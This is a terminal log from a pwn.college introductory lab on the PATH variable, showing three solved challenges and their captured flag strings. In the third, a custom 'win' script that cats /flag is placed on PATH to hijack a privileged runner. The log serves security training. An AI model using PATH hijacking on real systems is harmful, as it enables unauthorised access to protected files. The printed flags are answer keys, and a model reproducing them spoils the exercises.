Pondering PATH














hacker@path~setting-path:~$ PATH=/challenge/more_commands /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{ApmXFJwjwMlSDFhy-rKRDqQfhnv.QX1cjM1wSNxIzNzEzW}




hacker@path~finding-commands:~$ DIR="$(dirname "$(which win)")"
hacker@path~finding-commands:~$ echo "win lives in: $DIR"
win lives in: /challenge/paths/6286
hacker@path~finding-commands:~$ ls -la /challenge/paths/6286
total 16
drwxr-xr-x  2 root root 4096 Oct  7 08:38 .
drwx--x--x 52 root root 4096 Oct  7 08:38 ..
-rw-r--r--  1 root root   61 Oct  7 08:38 flag
-rwsr-xr-x  1 root root   97 Jun  6 11:37 win
hacker@path~finding-commands:~$ readlink -f /challenge/paths/6286/flag || true
/challenge/paths/6286/flag
hacker@path~finding-commands:~$ cat /challenge/paths/6286/flag
pwn.college{gxHTTu43A2ZkqUYi-IOfOm78pbX.01NzEzNxwSNxIzNzEzW}






hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
/challenge/run: line 4: win: command not found
It looks like that did not work... Did you set PATH correctly?
hacker@path~adding-commands:~$ mkdir -p "$HOME/mywin"
hacker@path~adding-commands:~$ CAT="$(command -v cat 2>/dev/null || echo /bin/cat)"
hacker@path~adding-commands:~$ printf '%s\n' '#!/bin/sh' "exec \"$CAT\" /flag" > "$HOME/mywin/win"
hacker@path~adding-commands:~$ chmod +x "$HOME/mywin/win"
hacker@path~adding-commands:~$ PATH="$HOME/mywin" /challenge/run
Invoking 'win'....
pwn.college{cPS5dgIfEx-xgFMwAcBVSzwS1J_.QX2cjM1wSNxIzNzEzW}









